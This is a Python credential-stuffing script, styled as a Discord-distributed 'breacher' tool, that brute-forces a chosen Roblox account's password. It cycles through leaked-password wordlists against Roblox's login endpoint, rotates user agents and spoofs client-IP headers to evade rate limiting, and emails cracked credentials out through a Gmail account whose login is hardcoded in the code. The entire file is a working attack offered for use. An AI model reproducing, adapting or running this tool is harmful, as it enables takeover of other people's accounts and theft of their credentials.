import requests
import time
import random
from datetime import datetime
from tqdm import tqdm
from colorama import Fore, Style, init
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import sys
import os

init(autoreset=True)

user_agents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0',
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.10586',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/603.3.8 (KHTML, like Gecko) Version/10.1.2 Safari/603.3.8',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0'
]

ip_addresses = [
    '127.0.0.1', '192.168.1.1', '10.0.0.1', '172.16.0.1', '8.8.8.8', '8.8.4.4', '1.1.1.1', '9.9.9.9', '104.16.54.23', '178.32.56.72'
]

rainbow_colors = [Fore.RED, Fore.YELLOW, Fore.GREEN, Fore.CYAN, Fore.BLUE, Fore.MAGENTA]

ascii_art = """
   
  _   _   _    _   _  __  ______    _____     ____    _____    ______               _____   _    _   ______   _____              __ 
 | \ | | | |  | | | |/ / |  ____|  / ____|   |  _ \  |  __ \  |  ____|     /\      / ____| | |  | | |  ____| |  __ \            /_ |
 |  \| | | |  | | | ' /  | |__    | (___     | |_) | | |__) | | |__       /  \    | |      | |__| | | |__    | |__) |   __   __  | |
 | . ` | | |  | | |  <   |  __|    \___ \    |  _ <  |  _  /  |  __|     / /\ \   | |      |  __  | |  __|   |  _  /    \ \ / /  | |
 | |\  | | |__| | | . \  | |____   ____) |   | |_) | | | \ \  | |____   / ____ \  | |____  | |  | | | |____  | | \ \     \ V /   | |
 |_| \_|  \____/  |_|\_\ |______| |_____/    |____/  |_|  \_\ |______| /_/    \_\  \_____| |_|  |_| |______| |_|  \_\     \_/    |_|
                                                                                                                                    
                                                                                                                                    
   __  _____            _       _                               _   _   _     _                  __                                 
  / / |  __ \          | |     | |                             | | (_) | |   (_)                 \ \                                
 | |  | |__) |   ___   | |__   | |   ___   __  __     ___    __| |  _  | |_   _    ___    _ __    | |                               
 | |  |  _  /   / _ \  | '_ \  | |  / _ \  \ \/ /    / _ \  / _` | | | | __| | |  / _ \  | '_ \   | |                               
 | |  | | \ \  | (_) | | |_) | | | | (_) |  >  <    |  __/ | (_| | | | | |_  | | | (_) | | | | |  | |                               
 | |  |_|  \_\  \___/  |_.__/  |_|  \___/  /_/\_\    \___|  \__,_| |_|  \__| |_|  \___/  |_| |_|  | |                               
  \_\                                                                                            /_/                                
                                                                                                                                    
Made by iNukedyou on Discord!
Version 1: v1
Enjoy >;)
"""

def print_loading_screen():
    print(Fore.GREEN + "Initializing script...")
    for _ in tqdm(range(100), desc="Loading...", ncols=100, bar_format="{l_bar}{bar}| {n_fmt}/{total_fmt}"):
        time.sleep(0.04)

def send_email(success, username, password, receiver_email):
    sender_email = 'nbreacherbot@gmail.com'
    subject = "Brute Force Notification"
    body = f"Success: {success}\nUsername: {username}\nPassword: {password}"
    
    msg = MIMEMultipart()
    msg['From'] = sender_email
    msg['To'] = receiver_email
    msg['Subject'] = subject
    msg.attach(MIMEText(body, 'plain'))

    try:
        with smtplib.SMTP('smtp.gmail.com', 587) as server:
            server.starttls()
            server.login(sender_email, 'breacherbot!1')
            text = msg.as_string()
            server.sendmail(sender_email, receiver_email, text)
        print(f"\n[INFO] Email sent to {receiver_email}")
    except Exception as e:
        print(f"[ERROR] Failed to send email: {e}")

def read_passwords(file_path):
    with open(file_path, 'r') as file:
        passwords = file.readlines()
    return [password.strip() for password in passwords]

def attempt_login(username, password, user_agent, ip_address, token=None, cookie=None):
    url = 'https://www.roblox.com/newlogin'
    headers = {
        'User-Agent': user_agent,
        'X-Forwarded-For': ip_address,
        'X-Originating-IP': ip_address,
        'X-Remote-IP': ip_address,
        'X-Remote-Addr': ip_address,
        'X-Client-IP': ip_address,
    }
    if token:
        headers['Authorization'] = f'Bearer {token}'
    if cookie:
        headers['Cookie'] = cookie

    data = {
        'ctype': 'Username',
        'cvalue': username,
        'password': password
    }

    try:
        response = requests.post(url, headers=headers, data=data, timeout=10)
        return response
    except requests.RequestException as e:
        print(f"[ERROR] Request failed: {e}")
        return None

def log_attempt(username, password, success, retries=0):
    with open('login_attempts.log', 'a') as log_file:
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        log_file.write(f"{timestamp} - Username: {username}, Password: {password}, Success: {success}, Retries: {retries}\n")

def track_passwords_per_minute(start_time, total_attempts):
    elapsed_time = time.time() - start_time
    passwords_per_minute = total_attempts / (elapsed_time / 60)
    print(f"\n[INFO] {total_attempts} attempts made ({passwords_per_minute:.2f} passwords/min)\n")

def estimate_time_left(total_attempts, passwords, start_time):
    if total_attempts == 0:
        print("No attempts made yet. Estimating time left is not possible.")
        return

    attempts_left = sum(len(read_passwords(f)) for f in passwords) - total_attempts
    elapsed_time = time.time() - start_time

    if attempts_left <= 0:
        print("All attempts completed!")
        return

    estimated_time = (elapsed_time / total_attempts) * attempts_left
    print(f"Estimated time left: {estimated_time / 60:.2f} minutes")

def print_box(title, content, stats=None):
    sys.stdout.write(f"\033[F\033[K{Fore.CYAN}==========================================\n")
    sys.stdout.write(f"{Fore.GREEN}{title}\n")
    sys.stdout.write(f"{Fore.WHITE}{content}\n")
    if stats:
        sys.stdout.write(f"{Fore.YELLOW}{stats}\n")
    sys.stdout.write(f"{Fore.CYAN}==========================================\n")

def prompt_user():
    print(Fore.YELLOW + "Choose an option:")
    print(Fore.GREEN + "1. Use system defined delay")
    print(Fore.RED + "2. Define custom delay per attempt")
    choice = input(Fore.CYAN + "Enter your choice (1/2): ")
    if choice == '2':
        delay = float(input(Fore.CYAN + "Enter delay in seconds (between 1-5): "))
        if delay < 1 or delay > 5:
            print(Fore.RED + "Invalid input. Using system defined delay.")
            return True
        else:
            return False
    return True

def check_delay_customization():
    while True:
        choice = prompt_user()
        if choice:
            return True
        else:
            print(Fore.RED + "Custom delay too high. You are proceeding at your own risk.")

def brute_force(username, password_files, token=None, cookie=None, email_updates=None, randomize_rate=True):
    total_attempts = 0
    start_time = time.time()
    print_loading_screen()

    print_box("PASSWORD GUESS", "")
    print_box("LOGGING", "")

    for password_file in password_files:
        passwords = read_passwords(password_file)
        if not passwords:
            print(f"[ERROR] No passwords found in {password_file}")
            continue

        for password in passwords:
            total_attempts += 1
            user_agent = random.choice(user_agents)
            ip_address = random.choice(ip_addresses)

            response = attempt_login(username, password, user_agent, ip_address, token, cookie)
            success = "Success" if response and response.status_code == 200 else "Failure"

            print_box(f"Current Password Guess: {password}", "", f"Success: {success}")
            log_attempt(username, password, success, retries=total_attempts)

            if success == "Success":
                print(f"\n{Fore.GREEN}SUCCESS: {username} - {password}")
                if email_updates:
                    send_email(success, username, password, email_updates)
                break

            if total_attempts % 50 == 0:
                track_passwords_per_minute(start_time, total_attempts)

            if total_attempts % 500 == 0:
                estimate_time_left(total_attempts, password_files, start_time)

            time.sleep(1 if randomize_rate else 0.5)
        else:
            continue
        break

if __name__ == "__main__":
    print(ascii_art)
    username = input("Enter the username: ")
    token = input("Enter Bearer Token (if applicable, press Enter to skip): ")
    cookie = input("Enter Cookie (if applicable, press Enter to skip): ")

    email_choice = input("Do you want email updates? (midway/end/none): ").lower()
    email_updates = None
    if email_choice in ['midway', 'end']:
        email_updates = input("Enter your email to receive notifications: ")

    password_files = ['darkweb2017-top10000.txt', 'fortinet-2021_passwords.txt']

    randomize_rate = check_delay_customization()

    brute_force(username, password_files, token if token else None, cookie if cookie else None, email_updates)
